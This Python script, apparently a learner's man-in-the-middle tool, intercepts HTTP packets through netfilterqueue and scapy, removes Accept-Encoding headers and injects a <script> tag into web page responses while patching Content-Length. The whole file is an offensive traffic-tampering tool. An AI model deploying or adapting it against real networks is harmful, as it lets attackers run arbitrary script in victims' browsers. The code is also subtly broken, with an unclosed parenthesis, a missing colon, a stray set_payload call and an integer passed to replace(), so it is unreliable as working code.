#!/usr/bin/env python

# code_injector.py

import netfilterqueue
import scapy.all as scapy 
import re

def set_load(original_packet, load):
	original_packet[scapy.Raw].load = load
	del original_packet[scapy.IP].len
	del original_packet[scapy.IP].chksum
	del original_packet[scapy.TCP].chksum
	return original_packet

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		load = scapy_packet[scapy.Raw].load
		
		if scapy_packet[scapy.TCP].dport == 80:
			print("\n[+] Request sent ...\n")
			load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
			
		elif scapy_packet[scapy.TCP].sport == 80:
			print("\n[+] Response received ...\n")
			print(scapy_packet.show())
			injection_code = "<script>alert('Code Injection Successful')</script>"
			load = load.replace("</body>", injection_code + "</body>")
			content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
			if content_length_search:
				content_length = int(content_length_search.group(1)
				new_content_length = content_length + len(injection_code)
				load = load.replace(content_length, str(new_content_length))
			
		if load != scapy_packet[scapy.Raw].load 
			modified_packet = set_load(scapy_packet, load)
			set_payload(str(modified_packet))
			
	packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
